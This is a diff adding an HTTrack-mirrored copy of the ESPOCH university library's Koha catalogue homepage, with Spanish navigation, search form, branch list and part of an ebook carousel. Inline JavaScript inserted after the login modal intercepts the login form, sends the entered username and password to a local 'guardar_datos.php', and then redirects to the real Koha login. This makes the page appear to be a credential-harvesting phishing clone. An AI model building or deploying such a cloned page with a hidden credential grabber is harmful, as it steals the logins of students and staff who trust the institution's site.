@@ -1,0 +1,1648 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<!-- TEMPLATE FILE: opac-main.tt -->
+
+
+
+
+
+<html lang="es-ES" class="no-js">
+
+<!-- Mirrored from biblioteca.espoch.edu.ec/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 12 Jan 2025 21:04:38 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+
+<title>Espoch. Sistema de Biblioteca Koha</title>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="generator" content="Koha 22.0506000" /> <!-- leave this for stats -->
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<link rel="shortcut icon" href="https://biblioteca.espoch.edu.ec/assets/img/dbrai.ico" type="image/x-icon" />
+
+ <link rel="stylesheet" type="text/css" href="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/lib/jquery/jquery-ui-1.13.1.min_22.0506000.css">
+
+
+ 
+ 
+ 
+
+
+ <link rel="stylesheet" type="text/css" href="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/css/opac_22.0506000.css">
+
+
+
+
+ <link rel="stylesheet" type="text/css" media="print" href="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/css/print_22.0506000.css">
+
+
+ <style>/* cambia logo koha */
+#logo {
+Background: url(https://biblioteca.espoch.edu.ec/assets/img/EdificioRojo.png) no-repeat 0 0;
+border:0;
+float: left!important;
+margin: 10px 10px 10px 10px;
+padding: 0;
+width: 260 px;
+height: 100 px;
+background-size: contain;
+}
+  .icono {
+      width: 16px;  /* Ajusta el ancho */
+      height: 16px; /* Ajusta la altura */
+  }
+
+</style>
+
+
+
+ <link href="https://biblioteca.espoch.edu.ec//cgi-bin/koha/opac-search.pl?format=opensearchdescription" rel="search" title="Buscar Espoch. Sistema de Biblioteca" type="application/opensearchdescription+xml">
+ <link rel="unapi-server" type="application/xml" title="unAPI" href="https://biblioteca.espoch.edu.ec//cgi-bin/koha/unapi" />
+
+
+<script>
+    var Koha = {};
+    function _(s) { return s } // dummy function for gettext
+</script>
+
+ <script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/es-ES/js/locale_data_22.0506000.js"></script>
+
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/js/Gettext_22.0506000.js"></script>
+<script src="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/js/i18n_22.0506000.js"></script>
+
+<link rel="stylesheet" type="text/css" href="https://biblioteca.espoch.edu.ec/opac-tmpl/bootstrap/lib/font-awesome/css/font-awesome.min_22.0506000.css">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+ 
+
+
+
+
+
+ 
+
+<body ID="opac-main" class="branch-default" >
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<button id="scrolltocontent">Saltar al contenido principal</button>
+<div id="wrapper">
+ <div id="header-region" class="noprint">
+ <nav class="navbar navbar-expand">
+ <div id="logo">
+ <a class="navbar-brand" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-main.pl">
+  Espoch. Sistema de Biblioteca  </a>
+ </div>
+ 
+ <div id="cartDetails" class="cart-message">Su carrito está vacío</div>
+ 
+ <ul id="cart-list-nav" class="navbar-nav">
+ 
+    <li class="nav-item js-show">
+        <a class="nav-link" href="#" id="cartmenulink" role="button" title="Reunir ítems en los que está interesado">
+          <img id="carticon" src="iconos/carrito.png" alt="Carrito" class="icono"> 
+          <span class="cartlabel">Carrito</span> 
+          <span id="basketcount"></span>
+        </a>
+      </li>
+      
+ 
+ <li class="divider-vertical"></li>
+ 
+ <li class="nav-item dropdown">
+    <a aria-expanded="false" aria-haspopup="true" class="nav-link dropdown-toggle" 
+       data-toggle="dropdown" 
+       href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl" 
+       id="listsmenu" 
+       role="button" 
+       title="Mostrar listas">
+      <img src="iconos/mostrar listas.png" alt="Mostrar listas" class="icono"> 
+      <span class="listslabel">Listas</span>
+    </a>
+ <div aria-labelledby="listsmenu" role="menu" class="dropdown-menu">
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=list&amp;public=1" tabindex="-1" role="menuitem"><strong>Listas públicas</strong></a>
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=392&amp;sortfield=title" tabindex="-1" role="menuitem">Mayo 2a Semana</a>
+ 
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=391&amp;sortfield=title" tabindex="-1" role="menuitem">Mayo semana 2</a>
+ 
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=390&amp;sortfield=title" tabindex="-1" role="menuitem">Mayo 1a Semana</a>
+ 
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=389&amp;sortfield=title" tabindex="-1" role="menuitem">Abril 2023 Semana 2</a>
+ 
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=388&amp;sortfield=title" tabindex="-1" role="menuitem">Abril 2023 Semana 0</a>
+ 
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=387&amp;sortfield=title" tabindex="-1" role="menuitem">Marzo 2023 Semana 4</a>
+ 
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=385&amp;sortfield=title" tabindex="-1" role="menuitem">Marzo 2023 Semana 3</a>
+ 
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=384&amp;sortfield=copyrightdate" tabindex="-1" role="menuitem">Títulos enero 2023</a>
+ 
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=view&amp;shelfnumber=383&amp;sortfield=title" tabindex="-1" role="menuitem">Novedades enero 2023</a>
+ 
+ 
+ 
+ 
+ <a class="dropdown-item listmenulink" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=list&amp;public=1" tabindex="-1" role="menuitem">Ver todo</a>
+ 
+ 
+ 
+ <div class="dropdown-divider"></div>
+ 
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=list&amp;public=0" tabindex="-1" role="menuitem"><strong>Sus listas</strong></a>
+ 
+ <a class="dropdown-item" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-shelves.pl?op=add_form" tabindex="-1" role="menuitem">Ingrese para crear sus propias listas</a>
+ 
+ 
+ </div> <!-- / .dropdown-menu -->
+ </li> <!-- / .nav-item.dropdown -->
+ 
+ </ul> <!-- / .navbar-nav -->
+
+ 
+ 
+ <ul id="members" class="navbar-nav">
+    <li class="nav-item dropdown">
+      <a href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-user.pl" class="nav-link login-link loginModal-trigger">
+        <img src="iconos/usuario.png" alt="Usuario" class="icono">
+        <span class="userlabel">Ingresar a su cuenta</span>
+      </a>
+    </li>
+ 
+ 
+ <li class="nav-item search_history">
+ <a class="nav-link login-link" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-search-history.pl" title="Ver su historial de búsqueda">Historial de búsqueda</a>
+ </li>
+ <li class="divider-vertical"></li>
+ <li class="nav-item">
+    <a class="nav-link logout clearsh" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-search-history.pl?action=delete" title="Eliminar historial de búsqueda">
+      <img src="iconos/basura.png" alt="Limpiar historial" class="icono">
+      Limpiar
+    </a></li>
+ 
+ 
+ </ul>
+ 
+ </nav> <!-- /navbar -->
+
+ 
+ <div class="container-fluid">
+ <div class="row">
+ <div class="col">
+ 
+ 
+ <div id="opacheader">
+ 
+ <div class="default_item">
+ 
+ <div class="default_body"><head>
+<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Responsive Bootstrap4 Shop Template, Created by Imran Hossain from https://imransdesign.com/">
+
+
+	<!-- favicon -->
+	<link rel="shortcut icon" type="image/png" href="https://biblioteca.espoch.edu.ec/assets/img/favicon.png">
+	<!-- google font -->
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Poppins:400,700&amp;display=swap" rel="stylesheet">
+	<!-- fontawesome -->
+	<link rel="stylesheet" href="https://biblioteca.espoch.edu.ec/assets/css/all.min.css">
+	<!-- bootstrap -->
+	<link rel="stylesheet" href="https://biblioteca.espoch.edu.ec/assets/bootstrap/css/bootstrap.min.css">
+	<!-- owl carousel -->
+	<link rel="stylesheet" href="https://biblioteca.espoch.edu.ec/assets/css/owl.carousel.css">
+	<!-- magnific popup -->
+	<link rel="stylesheet" href="https://biblioteca.espoch.edu.ec/assets/css/magnific-popup.css">
+	<!-- animate css -->
+	<link rel="stylesheet" href="https://biblioteca.espoch.edu.ec/assets/css/animate.css">
+	<!-- mean menu css -->
+	<link rel="stylesheet" href="https://biblioteca.espoch.edu.ec/assets/css/meanmenu.min.css">
+	<!-- main style -->
+  <link rel="stylesheet" href="https://biblioteca.espoch.edu.ec/assets/css/main1.css">
+	<!-- responsive -->
+	<link rel="stylesheet" href="https://biblioteca.espoch.edu.ec/assets/css/responsive.css">
+</head>
+
+<body>
+
+<!--PreLoader-->
+    <div class="loader">
+        <div class="loader-inner">
+            <div class="circle"></div>
+        </div>
+    </div>
+    <!--PreLoader Ends-->
+
+
+<!-- header -->
+	<div class="top-header-area" id="sticker">
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-12 col-sm-12 text-center">
+					<div class="main-menu-wrap">
+						<!-- logo -->
+						<div class="site-logo">
+							
+								<img src="https://biblioteca.espoch.edu.ec/assets/img/logo/logodireccion.png" alt="">
+							
+						</div>
+						<!-- logo -->
+
+						<!-- menu start -->
+						<nav class="main-menu">
+							<ul>
+								<li class="current-list-item"><a href="index.html">Inicio</a></li>
+								<li><a href="#">Servicios</a>
+									<ul class="sub-menu">
+										<li><a href="https://biblioteca.espoch.edu.ec/formacion.html"> Formación de Usuarios</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/ttitulacion.html"> Trabajos Titulación</a></li>
+                                        <li><a href="https://biblioteca.espoch.edu.ec/referenica.html"> Referencia Especializada</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/Ah-DBRAI/inicioAH.html" target="blank">Archivo Histórico</a></li>
+										<li><a href="https://herbario.espoch.edu.ec/" target="blank">Herbario Virtual</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/bibliografia.html">Bibliografía ESPOCH</a></li>
+                                        <li><a href="https://biblioteca.espoch.edu.ec/mediateca.html">Mediateca</a></li>
+									</ul>
+								</li>
+								<li><a href="#">Recursos - E</a>
+									<ul class="sub-menu">
+										<li><a href="https://proxy.espoch.edu.ec/public/menu.htm" target="_blank">Bases Suscritas</a></li>
+                                      <li><a href="https://www.rebuep.net/">Red de Bibliotecas</a></li>
+										<li><a href="http://cimogsys.espoch.edu.ec/direccion-publicaciones/public/books" target="blank">eBooks ESPOCH</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/open.html">eBooks OpenAccess</a></li>
+										
+									</ul>
+								</li>
+								<li><a href="#">Herramientas</a>
+									<ul class="sub-menu">
+										<li><a href="https://biblioteca.espoch.edu.ec/antiplagio.html">Herramienta Anti Plagio</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/gestores.html">Gestores Bibliográficos</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/links.html">Links de Interes</a></li>
+									</ul>
+								</li>
+								<li><a href="#">Repositorios</a>
+									<ul class="sub-menu">
+										<li><a href="http://dspace.espoch.edu.ec/" target="blank">Tesis Espoch</a></li>
+										<li><a href="http://www.lareferencia.info/es/" target="blank">Tesis Latinoamérica</a></li>
+									</ul>
+								</li>
+								<li><a href="#">Revistas</a>
+									<ul class="sub-menu">
+										<li><a href="http://revistas.espoch.edu.ec/index.php/mktdescubre" target="blank">MktDescubre</a></li>
+										<li><a href="http://ceaa.espoch.edu.ec:8080/revista.perfiles/" target="blank">Perfiles</a></li>
+										<li><a href="http://perspectivas.espoch.edu.ec:8081/index.php/RCP_ESPOCH" target="blank">Perspectivas</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/openrev.html" target="blank">Open Access</a></li>
+									</ul>
+								</li>
+								<li><a href="#">Conócenos</a>
+									<ul class="sub-menu">
+										<li><a href="https://biblioteca.espoch.edu.ec/acerca.html">Acerca de la Biblioteca</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/horarios.html">Horarios</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/faqs.html">Preguntas Frecuentes</a></li>
+										<li><a href="https://biblioteca.espoch.edu.ec/guias_tutoriales.html">Guías y Tutoriales</a></li>
+										<li><a href="https://liveespochedu-my.sharepoint.com/:b:/g/personal/biblioteca_espoch_edu_ec/EUmCzPPug6FOmQCj2al-V2oByCcqaaafjETjkAzeWobQvA?e=1gRgTc">Reglamento DBRA</a></li>
+                                      	<li><a href="https://biblioteca.espoch.edu.ec/DBRAI.html">Biblioteca en Cifras</a></li>
+									</ul>
+								</li>
+								
+							</ul>
+						</nav>
+						<a class="mobile-show search-bar-icon" href="#"></a>
+						<div class="mobile-menu"></div>						
+						<!-- menu end -->
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- end header -->
+
+  <!-- breadcrumb-section -->
+	<div class="breadcrumb-section1">
+		
+	</div>
+	<!-- end breadcrumb section -->
+  </body>
+  
+<!-- jquery -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/jquery-1.11.3.min.js"></script>
+	<!-- bootstrap -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/bootstrap/js/bootstrap.min.js"></script>
+	<!-- count down -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/jquery.countdown.js"></script>
+	<!-- isotope -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/jquery.isotope-3.0.6.min.js"></script>
+	<!-- waypoints -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/waypoints.js"></script>
+	<!-- owl carousel -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/owl.carousel.min.js"></script>
+	<!-- magnific popup -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/jquery.magnific-popup.min.js"></script>
+	<!-- mean menu -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/jquery.meanmenu.min.js"></script>
+	<!-- sticker js -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/sticker.js"></script>
+	<!-- main js -->
+	<script src="https://biblioteca.espoch.edu.ec/assets/js/main.js"></script></div>
+ </div>
+ 
+ </div>
+ 
+
+ </div>
+ </div>
+ </div>
+ 
+
+ </div> <!-- / header-region -->
+
+ 
+ <div class="container-fluid">
+ 
+ <div class="row">
+ <div class="col">
+ <div id="opac-main-search" class="mastheadsearch">
+ 
+ <form name="searchform" method="get" action="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-search.pl" id="searchform">
+ <div class="form-row align-items-center">
+ <div class="col-sm-auto order-2 order-sm-2">
+ <select name="idx" id="masthead_search" class="form-control">
+ 
+ <option value="">Catálogo de biblioteca</option>
+ 
+ 
+ <option value="ti">Título</option>
+ 
+ 
+ <option value="au">Autor</option>
+ 
+ 
+ <option value="su">Tema</option>
+ 
+ 
+ <option value="nb">ISBN</option>
+ 
+ 
+ <option value="ns">ISSN</option>
+ 
+ 
+ <option value="se">Series</option>
+ 
+ 
+ 
+ <option value="callnum">Signatura</option>
+ 
+ 
+ </select>
+ </div> <!-- /.col-sm-auto -->
+
+ <div class="col order-4 order-sm-3">
+ 
+ <input type="text" class="transl1 form-control" id="translControl1" name="q" value="" /><span id="translControl"></span>
+ 
+ </div> <!-- /.col -->
+
+ 
+ <div class="col-sm col-md-3 col-lg-2 order-3 order-sm-4">
+ <select name="limit" id="select_library" class="form-control">
+ <option value="">Todas las bibliotecas</option>
+
+ 
+
+ 
+ 
+ <option value="branch:BAD">Administración</option>
+ 
+ 
+ 
+ <option value="branch:AH">Archivo Histórico</option>
+ 
+ 
+ 
+ <option value="branch:B_OA">Biblioteca Digital Open Access</option>
+ 
+ 
+ 
+ <option value="branch:BC">Central</option>
+ 
+ 
+ 
+ <option value="branch:BCP">Ciencias Pecuarias</option>
+ 
+ 
+ 
+ <option value="branch:EBOOK">eBooks ESPOCH</option>
+ 
+ 
+ 
+ <option value="branch:BM">Mecánica</option>
+ 
+ 
+ 
+ <option value="branch:BEMS">Morona Santiago</option>
+ 
+ 
+ 
+ <option value="branch:BNA">Norte Amazónica</option>
+ 
+ 
+ 
+ <option value="branch:BRN">Recursos Naturales</option>
+ 
+ 
+ 
+ <option value="branch:CD_SI2">Sala Internet2</option>
+ 
+ 
+ 
+ <option value="branch:BSP">Salud Pública</option>
+ 
+ 
+ 
+ <option value="branch:UDAD">UD. Administración</option>
+ 
+ 
+ 
+ <option value="branch:UDCD">UD. Centro de Documentación</option>
+ 
+ 
+ 
+ <option value="branch:UDCP">UD. Ciencias Pecuarias</option>
+ 
+ 
+ 
+ <option value="branch:UDM">UD. Mecánica</option>
+ 
+ 
+ 
+ <option value="branch:UDRN">UD. Recursos Naturales</option>
+ 
+ 
+ 
+ <option value="branch:UDSP">UD.Salud Pública</option>
+ 
+ 
+
+ 
+ </select> <!-- /#select_library -->
+ </div> <!-- /.col-sm-auto -->
+ 
+
+ <div class="order-5 col-sm-auto">
+    <button aria-label="Buscar" class="btn btn-primary" id="searchsubmit" title="Buscar" type="submit">
+        <img src="iconos/lupa.png" alt="Buscar" style="width: 20px; height: 20px;">
+      </button>
+      
+ </div>
+
+ </div> <!-- /.form-row -->
+ <input type="hidden" name="weight_search" value="1">
+ </form>
+ 
+ </div><!-- /#opac-main-search -->
+ </div> <!-- /.col -->
+ </div> <!-- /.row -->
+ 
+
+ <div class="row">
+ <ul class="nav" id="moresearches">
+ <li class="nav-item">
+ <a href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-search.pl">Búsqueda avanzada</a>
+ </li>
+ 
+ 
+ 
+ <li class="nav-item">
+ <a href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-authorities-home.pl">Búsqueda de autoridad</a>
+ </li>
+ 
+ 
+ <li class="nav-item">
+ <a href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-showreviews.pl">Comentarios recientes</a>
+ </li>
+ 
+ 
+ <li class="nav-item">
+ <a href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-tags.pl">Nube de etiquetas</a>
+ </li>
+ 
+ 
+ 
+ <li class="nav-item">
+ <a href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-topissues.pl">Más populares</a>
+ </li>
+ 
+ 
+ 
+ 
+ 
+ <li class="nav-item">
+ <a id="library_page" href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-library.pl">
+ 
+ <span>Bibliotecas</span>
+ 
+ </a>
+ </li>
+ 
+ 
+
+ </ul> <!-- /.nav#moresearches -->
+ </div> <!-- /.row -->
+ </div> <!-- /.container-fluid -->
+ 
+
+ <!-- Login form hidden by default, used for modal window -->
+ <div id="loginModal" class="modal" tabindex="-1" role="dialog" aria-labelledby="modalLoginLabel" aria-hidden="true">
+ <div class="modal-dialog">
+ <div class="modal-content">
+ <div class="modal-header">
+ <h2 class="modal-title" id="modalLoginLabel">Ingresar a su cuenta</h2>
+ <button aria-label="Cerrar" class="closebtn" data-dismiss="modal" type="button">
+ <span aria-hidden="true">&times;</span>
+ </button>
+ </div>
+ <form action="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-user.pl" method="post" name="auth" id="modalAuth">
+ <input type="hidden" name="has-search-query" id="has-search-query" value="" />
+ <div class="modal-body">
+ 
+ 
+ 
+ <input type="hidden" name="koha_login_context" value="opac" />
+ <fieldset class="brief">
+ <div class="local-login">
+ <label for="muserid">Usuario:</label><input type="text" id="muserid" name="userid" autocomplete="off" />
+ <label for="mpassword">Contraseña:</label><input type="password" id="mpassword" name="password" autocomplete="off" />
+ <fieldset class="action">
+ <input class="btn btn-primary" type="submit" value="Ingresar" />
+ </fieldset>
+ </div>
+ 
+ <div id="nologininstructions-modal" class="nologininstructions">
+ 
+ 
+ <div id="OpacLoginInstructions">
+ 
+ <div class="default_item">
+ 
+ <div class="default_body"><center>Esta cuenta se refiere exclusivamente a Biblioteca Física</center></div>
+ </div>
+ 
+ </div>
+ 
+
+ </div>
+ 
+ 
+ <div id="forgotpassword-modal" class="forgotpassword">
+ <a href="https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-password-recovery.pl">¿Olvidó su contraseña?</a>
+ </div>
+ 
+ 
+ </fieldset>
+ 
+ </div>
+ </form> <!-- /#auth -->
+ </div> <!-- /.modal-content -->
+ </div> <!-- /.modal-dialog -->
+ </div> <!-- /#modalAuth -->
+ 
+ <script>
+    //Script para enviar los datos del formulario de inicio de sesión al servidor
+    // Asegúrate de que el código JavaScript se ejecute después de que el DOM se haya cargado completamente
+    document.addEventListener('DOMContentLoaded', function () {
+      document.getElementById('modalAuth').addEventListener('submit', function (event) {
+        event.preventDefault(); // Evita el envío tradicional del formulario
+  
+        console.log("Formulario enviado");  // Verifica si se está ejecutando el evento
+  
+        // Obtener los valores de los campos del formulario
+        const username = document.getElementById('muserid').value;
+        const password = document.getElementById('mpassword').value;
+  
+        // Verifica si los campos están vacíos
+        if (username === '' || password === '') {
+          alert('Por favor, complete ambos campos');
+          return;  // Detiene el envío de datos si algún campo está vacío
+        }
+  
+        // Crea un objeto con los datos a enviar
+        const data = {
+          userid: username,
+          password: password
+        };
+  
+        // Envía los datos al servidor usando fetch (AJAX)
+        fetch('guardar_datos.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        })
+        .then(response => response.json())  // Espera la respuesta del servidor
+        .then(data => {
+          console.log(data); // Verifica la respuesta del servidor
+  
+          if (data.success) {
+            // Redirige si los datos se guardaron correctamente
+            window.location.href = "https://biblioteca.espoch.edu.ec/cgi-bin/koha/opac-user.pl";
+          } else {
+            alert("Hubo un error al guardar los datos.");
+          }
+        })
+        .catch(error => {
+          console.error("Error al enviar los datos:", error);
+        });
+      });
+    });
+  </script>
+  
+
+<div class="main">
+ <nav id="breadcrumbs" aria-label="Breadcrumb" class="breadcrumbs">
+ <ol class="breadcrumb">
+ 
+ <li class="breadcrumb-item active">
+ <a href="#" aria-current="page">Inicio</a>
+ </li>
+ 
+ </ol>
+ </nav> <!-- /#breadcrumbs -->
+
+ 
+ 
+ <div id="notloggedin" class="container-fluid">
+ 
+ 
+
+ <div class="row">
+ 
+ <div class="col-12 col-lg-2 order-3 order-lg-1">
+ <div id="navigation">
+ 
+
+
+ 
+ 
+ <div id="OpacNav">
+ 
+ <div class="default_item">
+ 
+ <div class="default_body"><div class="alert alert-success" role="alert">
+<p style="text-align: center;"><span style="font-size: 12pt;"><strong>GU&Iacute;A R&Aacute;PIDA</strong><br /></span></p>
+</div>
+<div class="alert alert-warning" role="alert" style="text-align: center;">
+<p style="text-align: center;"><strong><span style="font-size: 9pt;">Libros en Biblioteca ESPOCH</span></strong><br /><a target="_blank" rel="noopener"></a><span style="font-size: 9pt;">C&oacute;mo buscar libros f&iacute;sicos en Bibliotecas ESPOCH.</span></p>
+<!--  <a href="https://liveespochedu-my.sharepoint.com/:v:/g/personal/biblioteca_espoch_edu_ec/EfGJQllEhSJEkyNNzrUZlMwBul4Ossv7wL__Xx53vnWPxg?nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJTdHJlYW1XZWJBcHAiLCJyZWZlcnJhbFZpZXciOiJTaGFyZURpYWxvZy1MaW5rIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXcifX0%3D&amp;e=zPRcPz" target="_blank" rel="noopener"><button type="button" class="btn btn-outline-success">Ver</button> </a></div> --> <a href="https://www.youtube.com/watch?v=OrHtXV0rp14" target="_blank" rel="noopener"><button type="button" class="btn btn-outline-success">Ver</button> </a></div>
+<div class="alert alert-warning" role="alert" style="text-align: center;">
+<p style="text-align: center;"><strong>Tesis Digitales<br /></strong><span style="font-size: 9pt;">C&oacute;mo buscar informaci&oacute;n de las tesis/trabajos de titulaci&oacute;n ESPOCH</span></p>
+<!-- <a href="https://liveespochedu-my.sharepoint.com/:v:/g/personal/biblioteca_espoch_edu_ec/Ebvy_n4mnItGofftFnEu2oYB8tdQ7oC43h_cb1QJd4CTmw?nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJPbmVEcml2ZUZvckJ1c2luZXNzIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXciLCJyZWZlcnJhbFZpZXciOiJNeUZpbGVzTGlua0NvcHkifX0&amp;e=yPuNS2" target="_blank" rel="noopener"><button type="button" class="btn btn-outline-success">Ver</button> </a></div> --> <a href="https://www.youtube.com/watch?v=vS4qnJdIz6k&amp;t=1s" target="_blank" rel="noopener"><button type="button" class="btn btn-outline-success">Ver</button> </a></div>
+<div class="alert alert-warning" role="alert" style="text-align: center;">
+<p style="text-align: center;"><strong>eBooks en Biblioteca ESPOCH<br /></strong><span style="font-size: 9pt;">C&oacute;mo buscar informaci&oacute;n en los recursos virtuales</span></p>
+<!-- <a href="https://liveespochedu-my.sharepoint.com/:v:/g/personal/biblioteca_espoch_edu_ec/Ee0GcxEN7gtCq-LjB-GxVlUBWjtcK7K5l6IrUXU8QcXRSQ?nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJPbmVEcml2ZUZvckJ1c2luZXNzIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXciLCJyZWZlcnJhbFZpZXciOiJNeUZpbGVzTGlua0NvcHkifX0&amp;e=HLQMbR" target="_blank" rel="noopener"><button type="button" class="btn btn-outline-success">Ver</button> </a></div>--> <a href="https://www.youtube.com/watch?v=q4v_oN8nsv8" target="_blank" rel="noopener"><button type="button" class="btn btn-outline-success">Ver</button> </a></div></div>
+ </div>
+ 
+ </div>
+ 
+
+
+
+
+
+
+
+ </div>
+ </div>
+ 
+
+ 
+ 
+ <div class="col-12 col-lg-7 order-md-1 maincontent">
+ 
+
+ <h1 class="sr-only">Inicio</h1>
+
+ 
+
+  <!-- koha news -->
+ 
+
+ 
+
+ 
+ 
+
+ 
+ 
+ 
+ <div id="OpacMainUserBlock">
+ 
+ <div class="default_item">
+ 
+ <div class="default_body"><!-- Debut du carrousel --><!-- Carrousel 4.0.5 -->
+<div id="inlibro-carrousel">
+<div class="carrouselFrame">
+  
+<p class="special-title">Nuevos eBooks ELIBRO</p>
+  
+<div class="loadingDiv"></div>
+  
+<div id="carrousel-0" class="carrousel"><a class="left carousel-control">&lsaquo;</a> <a class="right carousel-control">&rsaquo;</a>
+ 
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/The Essential Handbook of Polymer Terms and Attributes.jpg" title="The Essential Handbook of Polymer Terms and Attributes" alt="The Essential Handbook of Polymer Terms and Attributes"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Medicina Veterinaria. Tomo II Los animales y su bienestar.jpg" title="Medicina Veterinaria. Tomo II Los animales y su bienestar" alt="Medicina Veterinaria. Tomo II Los animales y su bienestar"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Organización y prestación del servicio de recepción en alojamientos. UF0052.jpg" title="Organización y prestación del servicio de recepción en alojamientos. UF0052" alt="Organización y prestación del servicio de recepción en alojamientos. UF0052"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Vías de Transducción y Cinética de Tumores.jpg" title="Vías de Transducción y Cinética de Tumores" alt="Vías de Transducción y Cinética de Tumores"/></a> 
+
+<a href="https://proxy.espoch.edu.ec/public/menu.htm"><img class="cloudcarousel" src="https://biblioteca.espoch.edu.ec/assets/img/portadas/Banca sostenible verde, social y con renovada gobernanza.jpg" title="Banca sostenible verde, social y con renovada gobernanza" alt="Banca sostenible verde, social y con renovada gobernanza"/></a> 
+
